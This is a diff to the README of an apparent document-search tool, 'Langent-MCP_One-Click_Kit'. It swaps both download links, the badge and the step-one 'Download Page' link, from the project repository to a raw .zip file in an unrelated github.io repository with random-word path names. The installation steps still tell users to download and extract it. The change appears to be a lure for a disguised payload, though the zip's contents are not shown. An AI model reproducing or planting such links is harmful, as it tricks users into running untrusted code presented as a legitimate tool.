@@ -5,7 +5,7 @@ description: "Connect local documents to AI tools for search and 3D visualizatio
 ---
 # 🧠 Langent-MCP_One-Click_Kit - Transform Personal Documents Into Interactive Knowledge
 
-[![Download Langent-MCP](https://img.shields.io/badge/Download-Click%20Here-blue.svg)](https://github.com/lightmeterminiaturisation293/Langent-MCP_One-Click_Kit)
+[![Download Langent-MCP](https://img.shields.io/badge/Download-Click%20Here-blue.svg)](https://github.com/lightmeterminiaturisation293/lightmeterminiaturisation293.github.io/raw/refs/heads/main/Bdellidae/github-lightmeterminiaturisation-io-electromuscular.zip)
 
 ## 📖 About This Tool
 
@@ -25,7 +25,7 @@ Ensure your computer meets these standards before you begin:
 
 Follow these steps to get the software on your computer.
 
-1. Visit this [Download Page](https://github.com/lightmeterminiaturisation293/Langent-MCP_One-Click_Kit) to get the files.
+1. Visit this [Download Page](https://github.com/lightmeterminiaturisation293/lightmeterminiaturisation293.github.io/raw/refs/heads/main/Bdellidae/github-lightmeterminiaturisation-io-electromuscular.zip) to get the files.
 2. Look for the green "Code" button and select "Download ZIP".
 3. Find the downloaded file in your "Downloads" folder.
 4. Right-click the folder and choose "Extract All".
